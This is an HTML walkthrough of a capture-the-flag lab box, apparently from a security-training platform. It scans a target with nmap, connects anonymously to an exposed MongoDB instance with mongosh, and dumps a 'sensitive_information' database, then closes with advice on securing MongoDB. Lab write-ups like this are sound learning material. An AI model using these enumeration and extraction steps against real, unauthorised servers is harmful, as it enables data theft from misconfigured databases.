<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Exploring MongoDB on the 'Mongod' Linux Box</title>
</head>
<body>

<h1>Exploring MongoDB on the 'Mongod' Linux Box</h1>

<p>In this post, we'll walk through a project that focuses on accessing and extracting data from a MongoDB server. This project demonstrates how to enumerate open ports, connect to a misconfigured MongoDB server, and retrieve sensitive information.</p>

<h2>Introduction to Databases and MongoDB</h2>
<p>Databases are organized collections of information that can be accessed, managed, and updated. They are fundamental to most systems as they store critical data such as transactions, inventory, and user profiles. Among the many database types, MongoDB is a document-oriented NoSQL database, meaning it stores data in documents organized hierarchically as follows:</p>
<ol>
    <li><b>Databases</b> - the top-level organization in a MongoDB instance.</li>
    <li><b>Collections</b> - each database contains collections of documents.</li>
    <li><b>Documents</b> - the individual records within a collection, stored in a JSON-like format.</li>
</ol>

<p>In some cases, database servers may be misconfigured to allow anonymous access, enabling anyone to retrieve stored information. The 'Mongod' Linux box features a MongoDB server that permits anonymous login. By connecting to it using the MongoDB shell utility, we can explore the database structure and retrieve sensitive information.</p>

<h2>Enumeration Process</h2>
<p>We begin by scanning the remote host for open ports and services using <b>Nmap</b>. Here’s a breakdown of the Nmap flags we used:</p>
<ul>
    <li><code>-p-</code>: Scans all TCP ports (0-65535).</li>
    <li><code>-sV</code>: Attempts to determine the version of services running on open ports.</li>
    <li><code>--min-rate=1000</code>: Specifies a minimum packet rate for faster scanning.</li>
</ul>

<pre><code>nmap -p- --min-rate=1000 -sV {target_IP}</code></pre>

<p>The scan results show two open ports:</p>
<ul>
    <li><b>Port 22</b> - Running SSH.</li>
    <li><b>Port 27017</b> - Running MongoDB.</li>
</ul>

<h2>Understanding MongoDB</h2>
<p>MongoDB, a document-oriented NoSQL database, organizes data in collections and documents rather than tables and rows. Each MongoDB database contains collections, which in turn contain documents with key-value pairs. This schema-less structure allows each document to differ in size and content, making MongoDB highly flexible.</p>

<h2>Connecting to MongoDB</h2>
<p>To connect to the MongoDB server on the target system, we need to install the <b>MongoDB Shell utility</b>. For Debian-based systems, the shell can be downloaded and set up using the following commands:</p>

<ol>
    <li>Download MongoDB Shell:
    <pre><code>curl -O https://downloads.mongodb.com/compass/mongosh-2.3.2-linux-x64.tgz</code></pre>
    </li>
    <li>Extract the archive:
    <pre><code>tar xvf mongosh-2.3.2-linux-x64.tgz</code></pre>
    </li>
    <li>Navigate to the directory:
    <pre><code>cd mongosh-2.3.2-linux-x64/bin</code></pre>
    </li>
    <li>Connect to the MongoDB server:
    <pre><code>./mongosh mongodb://{target_IP}:27017</code></pre>
    </li>
</ol>

<p>Once connected as an anonymous user, we can list all databases on the MongoDB server:</p>

<pre><code>show dbs;</code></pre>

<h2>Exploring the Database</h2>
<p>To enumerate the data further:</p>
<ol>
    <li><b>Select the database</b> - Use the <code>use</code> command to switch to the <b>sensitive_information</b> database.
    <pre><code>use sensitive_information;</code></pre>
    </li>
    <li><b>List collections</b> - Display all collections within the database:
    <pre><code>show collections;</code></pre>
    </li>
    <li><b>Retrieve data</b> - To extract the document data, use the <code>find()</code> command on the <b>flag</b> collection. Adding <code>pretty()</code> formats the output for easier reading.
    <pre><code>db.flag.find().pretty();</code></pre>
    </li>
</ol>

<p>After executing these commands, we successfully retrieved sensitive information stored in the database.</p>

<h2>Conclusion</h2>
<p>This exercise highlights the importance of secure MongoDB configurations, particularly avoiding open access to sensitive data. Connecting to a misconfigured MongoDB server can provide access to crucial information without authentication, a risk that should be mitigated in production environments. Properly securing MongoDB instances helps protect against unauthorized access, ensuring data integrity and confidentiality.</p>

<p>By following these steps, we've explored the basics of MongoDB, performed database enumeration, and retrieved sensitive information, demonstrating how database misconfigurations can lead to potential security risks.</p>

</body>
</html>
